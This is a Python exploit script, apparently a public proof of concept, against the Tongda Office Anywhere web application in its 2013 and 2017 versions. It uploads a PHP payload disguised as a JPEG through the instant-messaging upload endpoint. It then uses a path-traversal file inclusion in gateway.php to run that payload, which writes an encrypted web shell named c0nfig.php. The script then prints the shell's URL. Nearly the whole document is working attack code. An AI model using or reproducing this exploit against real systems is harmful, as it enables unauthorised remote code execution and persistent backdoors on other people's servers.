import requests
import sys
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def exp(upload_url, include_url):
    inculde = '''<?php
                    $f = fopen("c0nfig.php","w");
                    $result = fwrite($f,"<?php session_start();isset(\$_GET['luckyeast'])?print \$_SESSION['k']=substr(md5(uniqid(rand())),16):(\$b=explode('|',openssl_decrypt(file_get_contents('php://input'), 'AES128', \$_SESSION['k'])))&call_user_func(\$b[0],\$b[1]);");
                    fclose($f);
                    echo '[+] finish';'''
    files = {'ATTACHMENT':inculde}
    upload_data={"P":"123","Filename":"php.jpg","DEST_UID":"1","UPLOAD_MODE":"2"}
    upload_res=requests.post(upload_url,upload_data,files=files)
    path = upload_res.text
    path = path[path.find('@')+1:path.rfind('|')].replace("_","\/").replace("|",".")

    include_data={"json":"{\"url\":\"/general/../../attach/im/"+path+"\"}"}
    include_res = requests.post(include_url,data=include_data)
    print(include_res.text)

if __name__ == '__main__':
    print '''
----------------------------------------------
OfficeAnywhere include script by LuckyEast >_< 
----------------------------------------------
usage: officeAnywhere.py http://127.0.0.1 2017
'''

url = sys.argv[1]
version = sys.argv[2]
upload_url = url + '/ispirit/im/upload.php'

if version == '2017':
    include_url = url + '/mac/gateway.php'
    exp(upload_url, include_url)
    print '[+] shell: ' + url + '/mac/c0nfig.php'
elif version == '2013':
    include_url = url + '/ispirit/interface/gateway.php'
    exp(upload_url, include_url)
    print '[+] shell: ' + url + '/ispirit/interface/c0nfig.php'
